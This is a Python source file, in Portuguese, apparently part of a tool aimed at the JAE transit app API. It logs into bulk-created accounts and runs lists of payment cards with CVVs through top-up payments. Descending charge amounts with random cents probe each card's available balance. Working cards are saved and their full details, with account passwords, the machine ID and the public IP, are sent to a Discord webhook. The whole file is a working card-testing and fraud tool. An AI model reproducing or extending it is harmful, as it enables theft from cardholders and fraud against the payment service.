def atualizar_device(jwt_token, codigo_cliente, token_device="fHp9MNfuT_iG7Or0LL7cPG:APA91bFbcbWuT4cuHX9v6X-9RKBQV-_N20Wm-_oK6NLqZZxzLsxFeyI0TZ0oQhpWHJrKtvGN35dBDS1zaECBdFsSLnis49uX0OrSVft-EUTYgmadlX6wI1U"):
    """
    Atualiza informações do device usando o token JWT e código do cliente
    """
    url = "https://api.jae.com.br/app-gateway/api/device/atualizar"
    
    headers = {
        "accept-encoding": "gzip",
        "authorization": jwt_token,
        "content-type": "application/json; charset=UTF-8",
        "host": "api.jae.com.br",
        "user-agent": "Dart/3.3 (dart:io)"
    }
    
    payload = {
        "deviceId": "",
        "idCliente": codigo_cliente,
        "tokenDevice": ""
    }
    
    try:
        print(f"Atualizando device para cliente: {codigo_cliente}")
        response = requests.post(url, headers=headers, data=json.dumps(payload))
        
        print(f"Status Code: {response.status_code}")
        print(f"Response Body: {response.text}")
        
        if response.status_code == 200:
            print("✅ Device atualizado com sucesso!")
            return response.json() if response.text else True
        else:
            print(f"❌ Erro ao atualizar device: {response.status_code}")
            return None
            
    except Exception as e:
        print(f"Erro ao atualizar device: {e}")
        return None

def salvar_cartao_aprovado(dados_cartao, conta, valor_aprovado):
    """
    Salva cartão aprovado no arquivo aprovados.txt
    """
    try:
        with open("aprovados.txt", "a", encoding="utf-8") as arquivo:
            linha = f"{dados_cartao['numero']}|{dados_cartao['mes']}|{dados_cartao['ano']}|{dados_cartao['cvv']}|{conta['cpf']}|{conta['nome']}|{valor_aprovado}\n"
            arquivo.write(linha)
        print(f"{Fore.GREEN}✅ Cartão salvo em aprovados.txt{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}❌ Erro ao salvar cartão aprovado: {e}{Style.RESET_ALL}")

def salvar_cartao_recusado(dados_cartao, conta, motivo="DECLINED"):
    """
    Salva cartão recusado no arquivo recusados.txt
    """
    try:
        with open("recusados.txt", "a", encoding="utf-8") as arquivo:
            linha = f"{dados_cartao['numero']}|{dados_cartao['mes']}|{dados_cartao['ano']}|{dados_cartao['cvv']}|{conta['cpf']}|{conta['nome']}|{motivo}\n"
            arquivo.write(linha)
        print(f"{Fore.RED}❌ Cartão salvo em recusados.txt{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}❌ Erro ao salvar cartão recusado: {e}{Style.RESET_ALL}")

def remover_cartao_de_pagamento(dados_cartao, arquivo_pagamento="pagamento.txt"):
    """
    Remove um cartão específico do arquivo pagamento.txt com base em numero|mes|ano|cvv
    """
    try:
        if not os.path.exists(arquivo_pagamento):
            print(f"⚠️ Arquivo {arquivo_pagamento} não encontrado para remoção de cartão")
            return False
        with open(arquivo_pagamento, 'r', encoding='utf-8') as f:
            linhas = f.readlines()
        alvo = f"{dados_cartao['numero']}|{dados_cartao['mes']}|{dados_cartao['ano']}|{dados_cartao['cvv']}".strip()
        novas = []
        removido = False
        for linha in linhas:
            linha_strip = linha.strip()
            if not linha_strip:
                novas.append(linha)
                continue
            if linha_strip.split('|')[:4] == alvo.split('|'):
                removido = True
                continue
            novas.append(linha)
        if removido:
            with open(arquivo_pagamento, 'w', encoding='utf-8') as f:
                f.writelines(novas)
            print(f"{Fore.GREEN}🗑️ Cartão removido de {arquivo_pagamento}{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.YELLOW}⚠️ Cartão não encontrado em {arquivo_pagamento}{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}❌ Erro ao remover cartão de {arquivo_pagamento}: {e}{Style.RESET_ALL}")
        return False

def salvar_conta_recarregada(conta, valor_aprovado, arquivo_recarregadas="recarregadas.txt"):
    """
    Salva a conta recarregada em recarregadas.txt no formato cpf|senha|valor
    """
    try:
        with open(arquivo_recarregadas, "a", encoding="utf-8") as f:
            linha = f"{conta.get('cpf','')}|{conta.get('senha','')}|{valor_aprovado:.2f}\n"
            f.write(linha)
        print(f"{Fore.GREEN}✅ Conta salva em {arquivo_recarregadas}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}❌ Erro ao salvar recarregada: {e}{Style.RESET_ALL}")

def remover_conta_de_contas(conta, arquivo_contas="contas.txt"):
    """
    Remove a linha correspondente à conta (cpf|senha|...) de contas.txt
    Tenta casar por CPF e senha para maior precisão.
    """
    try:
        if not os.path.exists(arquivo_contas):
            print(f"⚠️ Arquivo {arquivo_contas} não encontrado para remoção")
            return False
        with open(arquivo_contas, 'r', encoding='utf-8') as f:
            linhas = f.readlines()
        novas = []
        removida = False
        cpf_alvo = str(conta.get('cpf','')).strip()
        senha_alvo = str(conta.get('senha','')).strip()
        for linha in linhas:
            bruto = linha.rstrip('\n')
            partes = [p.strip() for p in bruto.split('|')]
            # Match por CPF e senha quando possível
            match_por_campos = (len(partes) >= 2 and partes[0] == cpf_alvo and partes[1] == senha_alvo)
            # Fallback: se alguma parte casa CPF e outra casa senha
            fallback_match = (cpf_alvo in partes and senha_alvo in partes)
            if match_por_campos or fallback_match:
                removida = True
                continue
            novas.append(linha)
        if removida:
            with open(arquivo_contas, 'w', encoding='utf-8') as f:
                f.writelines(novas)
            print(f"{Fore.GREEN}🗑️ Conta {cpf_alvo} removida de {arquivo_contas}{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.YELLOW}⚠️ Conta {cpf_alvo} não encontrada em {arquivo_contas}{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}❌ Erro ao remover conta de {arquivo_contas}: {e}{Style.RESET_ALL}")
        return False

def obter_ip_publico():
    """Obtém o IP público atual do dispositivo."""
    try:
        r = requests.get("https://api.ipify.org?format=json", timeout=7)
        if r.status_code == 200:
            return r.json().get("ip", "N/A")
        return "N/A"
    except Exception:
        return "N/A"

def obter_hwid():
    """Obtém um identificador de hardware (HWID) do Windows, com fallback para MAC."""
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
        val, _ = winreg.QueryValueEx(key, "MachineGuid")
        return val
    except Exception:
        try:
            return hex(uuid.getnode())
        except Exception:
            return "N/A"

def enviar_webhook_recarga_aprovada(webhook_url, dados_cartao, conta, valor_aprovado, hwid=None, ip_publico=None):
    """
    Envia uma notificação para Discord quando a recarga é aprovada (formato embed).
    """
    try:
        if not ip_publico:
            ip_publico = obter_ip_publico()
        if not hwid:
            hwid = obter_hwid()
        hora = datetime.now().strftime("%H:%M")
        embed = {
            "title": "✅ Recarga Aprovada",
            "description": "Detalhes da operação",
            "color": 3066993,
            "fields": [
                {
                    "name": "Cartão",
                    "value": f"{dados_cartao['numero']}|{dados_cartao['mes']}|{dados_cartao['ano']}|{dados_cartao['cvv']}",
                    "inline": False
                },
                {
                    "name": "Conta",
                    "value": (
                        f"CPF: {conta.get('cpf','')}\n"
                        f"Nome: {conta.get('nome','')}\n"
                        f"Usuario: N/A\n"
                        f"Senha: {conta.get('senha','')}"
                    ),
                    "inline": False
                },
                {
                    "name": "Valor",
                    "value": f"R$ {valor_aprovado:.2f}",
                    "inline": True
                },
                {
                    "name": "HWID",
                    "value": f"{hwid}",
                    "inline": False
                },
                {
                    "name": "IP Público",
                    "value": f"{ip_publico}",
                    "inline": True
                }
            ],
            "footer": {"text": f"Sistema de Recargas JAE • Hoje às {hora}"},
            "timestamp": datetime.utcnow().isoformat() + "Z"
        }
        payload = {"username": "Sistema de Recargas JAE", "embeds": [embed]}
        resp = requests.post(webhook_url, json=payload, timeout=10)
        if resp.status_code in (200, 204):
            print(f"{Fore.GREEN}📣 Webhook enviado com sucesso{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}⚠️ Falha ao enviar webhook: {resp.status_code} - {resp.text}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}❌ Erro ao enviar webhook: {e}{Style.RESET_ALL}")

def tentar_pagamento_escalonado(jwt_token, codigo_cliente, token_cartao, customer_data, card_data, dados_cartao, conta):
    """
    Tenta pagamento com valores escalonados: 150 -> 100 -> 50 -> 30
    """
    # Adicionar centavos aleatórios aos valores base
    valores = [
        147.0 + round(random.uniform(0.01, 0.99), 2),
        100.0 + round(random.uniform(0.01, 0.99), 2),
        50.0 + round(random.uniform(0.01, 0.99), 2),
        30.0 + round(random.uniform(0.01, 0.99), 2)
    ]
    
    for valor in valores:
        print(f"{Fore.YELLOW}💰 Tentando pagamento de R$ {valor:.2f}...{Style.RESET_ALL}")
        
        # Criar pedido com o valor atual
        pedido_data = criar_pedido(jwt_token, codigo_cliente, valor)
        if not pedido_data:
            print(f"{Fore.RED}❌ Falha ao criar pedido de R$ {valor:.2f}{Style.RESET_ALL}")
            continue
        
        order_id = pedido_data.get('numero')
        if not order_id:
            print(f"{Fore.RED}❌ ID do pedido não encontrado para R$ {valor:.2f}{Style.RESET_ALL}")
            continue
        
        # Processar pagamento
        pagamento_data = processar_pagamento_cartao(
            jwt_token, 
            order_id, 
            valor,
            token_cartao,
            customer_data,
            card_data
        )
        
        if pagamento_data:
            status_pagamento, mensagem = detectar_status_pagamento(pagamento_data)
            
            if status_pagamento == "APROVADO":
                print(f"{Fore.GREEN}✅ PAGAMENTO APROVADO com R$ {valor:.2f}!{Style.RESET_ALL}")
                salvar_cartao_aprovado(dados_cartao, conta, valor)
                return True, valor
            elif status_pagamento == "REJEITADO":
                # Verificar se é saldo insuficiente
                if "saldo insuficiente" in mensagem.lower() or "insufficient" in mensagem.lower() or "PAYMENTS-113" in str(pagamento_data):
                    print(f"{Fore.YELLOW}⚠️ Saldo insuficiente para R$ {valor:.2f}, tentando valor menor...{Style.RESET_ALL}")
                    continue
                else:
                    # Cartão foi recusado por outro motivo
                    print(f"{Fore.RED}❌ Cartão RECUSADO: {mensagem}{Style.RESET_ALL}")
                    salvar_cartao_recusado(dados_cartao, conta, mensagem)
                    return False, 0
            else:
                print(f"{Fore.YELLOW}⏳ Status: {status_pagamento} - {mensagem}{Style.RESET_ALL}")
                continue
        else:
            print(f"{Fore.RED}❌ Falha no processamento do pagamento de R$ {valor:.2f}{Style.RESET_ALL}")
            continue
    
    # Se chegou aqui, nenhum valor funcionou
    print(f"{Fore.RED}❌ Nenhum valor funcionou para este cartão{Style.RESET_ALL}")
    salvar_cartao_recusado(dados_cartao, conta, "TODOS_VALORES_FALHARAM")
    return False, 0

def efetuar_recarga_contas(limite=None):
    """
    Função para efetuar recarga nas contas salvas em contas.txt
    Lê os dados de pagamento do arquivo pagamento.txt
    """
    print(f"{Fore.CYAN}=== INICIANDO PROCESSO DE RECARGA ==={Style.RESET_ALL}")
    
    # Ler contas criadas
    contas = ler_contas_criadas()
    if not contas:
        print(f"{Fore.RED}❌ Nenhuma conta encontrada em contas.txt{Style.RESET_ALL}")
        return
    
    # Ler lista de cartões
    lista_cartoes = ler_lista_cartoes()
    if not lista_cartoes:
        print(f"{Fore.RED}❌ Nenhum cartão encontrado em pagamento.txt{Style.RESET_ALL}")
        return
    
    print(f"{Fore.GREEN}📋 Encontradas {len(contas)} contas para recarga{Style.RESET_ALL}")
    
    # Aplicar limite se especificado
    if limite and limite < len(contas):
        contas = contas[:limite]
        print(f"{Fore.YELLOW}🔢 Limitando processamento a {limite} contas{Style.RESET_ALL}")
    
    print(f"{Fore.BLUE}💳 Cartões carregados: {len(lista_cartoes)}{Style.RESET_ALL}")
    ip_publico = obter_ip_publico()
    hwid = obter_hwid()
    
    sucessos = 0
    falhas = 0
    
    for i, conta in enumerate(contas, 1):
        print(f"\n{Fore.YELLOW}--- PROCESSANDO CONTA {i}/{len(contas)} ---{Style.RESET_ALL}")
        print(f"{Fore.CYAN}CPF: {conta['cpf']}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Nome: {conta['nome']}{Style.RESET_ALL}")
        
        # Fazer login
        print(f"{Fore.BLUE}Fazendo login...{Style.RESET_ALL}")
        # Usar sempre a senha do config.ini para login
        token_jwt = obter_token_jwt(conta['cpf'], SENHA_CONFIG)
        if not token_jwt:
            print(f"{Fore.RED}❌ Falha no login{Style.RESET_ALL}")
            falhas += 1
            continue
        
        print(f"{Fore.GREEN}✅ Login realizado com sucesso!{Style.RESET_ALL}")
        
        # Usar código do cliente salvo ou extrair do token
        codigo_cliente = conta.get('codigo_cliente')
        if not codigo_cliente:
            # Tentar extrair do token se não tiver salvo
            decoded = decodificar_token_jwt(token_jwt)
            if decoded:
                codigo_cliente = decoded.get('codigo')
        
        if not codigo_cliente:
            print(f"{Fore.RED}❌ Código do cliente não encontrado{Style.RESET_ALL}")
            falhas += 1
            continue
        
        # Verificar pedidos em aberto
        print(f"{Fore.BLUE}Verificando pedidos em aberto...{Style.RESET_ALL}")
        pedidos_data = verificar_pedidos_em_aberto(token_jwt, codigo_cliente)
        
        # Se não há pedidos em aberto (404), vamos criar um novo pedido
        if not pedidos_data:
            print(f"{Fore.YELLOW}📝 Nenhum pedido em aberto encontrado, criando novo pedido...{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}✅ Pedidos em aberto verificados!{Style.RESET_ALL}")
        
        # Tentar com cartões até aprovar ou esgotar
        aprovado_com_algum_cartao = False
        # Índice do cartão atual que está "live". Mantido fora do loop de contas.
        if 'indice_cartao_live' not in locals():
            indice_cartao_live = 0

        # Se não houver mais cartões disponíveis, encerra o processo
        if not lista_cartoes or len(lista_cartoes) == 0:
            print(f"{Fore.RED}❌ Não existem mais cartões para recarregar as contas{Style.RESET_ALL}")
            return

        # Começa pelo cartão "live" atual, depois tenta os demais
        ordem_indices = list(range(indice_cartao_live, len(lista_cartoes))) + list(range(0, indice_cartao_live))
        indices_para_remover = []
        for idx in ordem_indices:
            dados_cartao = lista_cartoes[idx]
            print(f"{Fore.BLUE}💳 Tentando com cartão ****{dados_cartao['numero'][-4:]} (#{idx+1}){Style.RESET_ALL}")

            # Obter token do cartão
            print(f"{Fore.BLUE}Obtendo token do cartão...{Style.RESET_ALL}")
            token_cartao_data = obter_token_cartao(token_jwt, codigo_cliente, dados_cartao['numero'])
            if not token_cartao_data or not token_cartao_data.get('token'):
                print(f"{Fore.RED}❌ Falha ao obter token do cartão{Style.RESET_ALL}")
                indices_para_remover.append(idx)
                continue

            print(f"{Fore.GREEN}✅ Token do cartão obtido!{Style.RESET_ALL}")

            # Processamento com sistema escalonado (criação de pedidos ocorre dentro da função)
            print(f"{Fore.CYAN}Processando pagamento com sistema escalonado...{Style.RESET_ALL}")
            # Preparar dados do cartão para pagamento
            card_data = {
                "cardholder_name": conta['nome'],
                "security_code": dados_cartao['cvv'],
                "brand": "Elo",
                "expiration_month": dados_cartao['mes'].zfill(2),
                "expiration_year": dados_cartao['ano']
            }

            customer_data = {
                'codigo': codigo_cliente,
                'nome': conta['nome'],
                'email': conta.get('email', ""),
                'cpf': conta['cpf'],
                'telefone': conta.get('telefone', "")
            }

            sucesso, valor_aprovado = tentar_pagamento_escalonado(
                token_jwt,
                codigo_cliente,
                token_cartao_data.get('token'),
                customer_data,
                card_data,
                dados_cartao,
                conta
            )

            if sucesso:
                print(f"{Fore.GREEN}✅ Recarga processada com sucesso com R$ {valor_aprovado:.2f}!{Style.RESET_ALL}")
                salvar_conta_recarregada(conta, valor_aprovado)
                remover_conta_de_contas(conta)
                enviar_webhook_recarga_aprovada(DISCORD_WEBHOOK_URL, dados_cartao, conta, valor_aprovado, hwid, ip_publico)
                sucessos += 1
                aprovado_com_algum_cartao = True
                # Mantém este cartão como "live" para próxima conta
                indice_cartao_live = idx
                break
            else:
                print(f"{Fore.RED}❌ Recarga falhou com este cartão, marcando para remoção...{Style.RESET_ALL}")
                indices_para_remover.append(idx)
                # Continua tentando próximo cartão
                continue

        # Remover cartões que falharam nesta conta do arquivo e da lista
        if indices_para_remover:
            # Remover do arquivo pagamento.txt
            for idx in sorted(set(indices_para_remover), reverse=True):
                if 0 <= idx < len(lista_cartoes):
                    remover_cartao_de_pagamento(lista_cartoes[idx])
            # Recarregar lista de cartões do arquivo após remoções
            lista_cartoes = ler_lista_cartoes()
            # Ajustar índice "live" se necessário
            if lista_cartoes:
                indice_cartao_live = min(indice_cartao_live, len(lista_cartoes) - 1)
            else:
                print(f"{Fore.RED}❌ Não existem mais cartões para recarregar as contas{Style.RESET_ALL}")
                return

        if not aprovado_com_algum_cartao:
            print(f"{Fore.RED}❌ Recarga falhou com todos os cartões para esta conta{Style.RESET_ALL}")
            falhas += 1
        
        # Aguardar entre processamentos
        print(f"{Fore.BLUE}Aguardando 2 segundos...{Style.RESET_ALL}")
    
    # Resumo final
    print(f"\n{Fore.CYAN}=== RESUMO DA RECARGA ==={Style.RESET_ALL}")
    print(f"{Fore.GREEN}✅ Sucessos: {sucessos}{Style.RESET_ALL}")
    print(f"{Fore.RED}❌ Falhas: {falhas}{Style.RESET_ALL}")
    print(f"{Fore.BLUE}📊 Total processado: {len(contas)}{Style.RESET_ALL}")

def mostrar_menu():
    """
    Exibe o menu principal do sistema
    """
    print(f"\n{Fore.CYAN}=================================================={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}           SISTEMA JAE - MENU PRINCIPAL{Style.RESET_ALL}")
    print(f"{Fore.CYAN}=================================================={Style.RESET_ALL}")
    print(f"{Fore.GREEN}1. 📝 Gerar Contas (apenas criar contas){Style.RESET_ALL}")
    print(f"{Fore.BLUE}2. 🔄 Gerar Contas + Pagamento (criar e pagar){Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}3. 💰 Efetuar Recarga (nas contas criadas){Style.RESET_ALL}")
    print(f"{Fore.RED}4. 🚪 Sair{Style.RESET_ALL}")
    print(f"{Fore.CYAN}=================================================={Style.RESET_ALL}")

def main():
    """
    Função principal do programa
    """
    while True:
        mostrar_menu()
        
        try:
            opcao = input(f"{Fore.YELLOW}Escolha uma opção (1-4): {Style.RESET_ALL}").strip()
            
            if opcao == "1":
                print(f"\n{Fore.GREEN}📝 Iniciando geração de contas...{Style.RESET_ALL}")
                
                # Perguntar quantidade de contas
                try:
                    quantidade = input(f"{Fore.YELLOW}Quantas contas deseja gerar? (Enter para todas): {Style.RESET_ALL}").strip()
                    limite = int(quantidade) if quantidade else None
                    processar_cadastros_lista_simples(limite=limite)
                except ValueError:
                    print(f"{Fore.RED}❌ Quantidade inválida! Processando todas as contas.{Style.RESET_ALL}")
                    processar_cadastros_lista_simples()
                
            elif opcao == "2":
                print(f"\n{Fore.BLUE}🔄 Iniciando geração de contas com pagamento...{Style.RESET_ALL}")
                
                # Perguntar quantidade de contas
                try:
                    quantidade = input(f"{Fore.YELLOW}Quantas contas deseja gerar? (Enter para todas): {Style.RESET_ALL}").strip()
                    limite = int(quantidade) if quantidade else None
                    processar_cadastros_lista(limite=limite)
                except ValueError:
                    print(f"{Fore.RED}❌ Quantidade inválida! Processando todas as contas.{Style.RESET_ALL}")
                    processar_cadastros_lista()
                
            elif opcao == "3":
                print(f"\n{Fore.MAGENTA}💰 Iniciando processo de recarga...{Style.RESET_ALL}")
                
                # Perguntar quantidade de contas para recarga
                try:
                    quantidade = input(f"{Fore.YELLOW}Quantas contas deseja recarregar? (Enter para todas): {Style.RESET_ALL}").strip()
                    limite = int(quantidade) if quantidade else None
                    efetuar_recarga_contas(limite=limite)
                except ValueError:
                    print(f"{Fore.RED}❌ Quantidade inválida! Processando todas as contas.{Style.RESET_ALL}")
                    efetuar_recarga_contas()
                
            elif opcao == "4":
                print(f"\n{Fore.GREEN}👋 Saindo do sistema. Até logo!{Style.RESET_ALL}")
                break
                
            else:
                print(f"\n{Fore.RED}❌ Opção inválida! Escolha 1, 2, 3 ou 4.{Style.RESET_ALL}")
            
            # Pausa para o usuário ver o resultado
            input(f"\n{Fore.CYAN}Pressione Enter para continuar...{Style.RESET_ALL}")
            
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}👋 Sistema interrompido pelo usuário.{Style.RESET_ALL}")
            break
        except Exception as e:
            print(f"\n{Fore.RED}❌ Erro inesperado: {e}{Style.RESET_ALL}")
            input(f"{Fore.CYAN}Pressione Enter para continuar...{Style.RESET_ALL}")

# Execução do código
if __name__ == "__main__":
    # Novo sistema com menu
    main()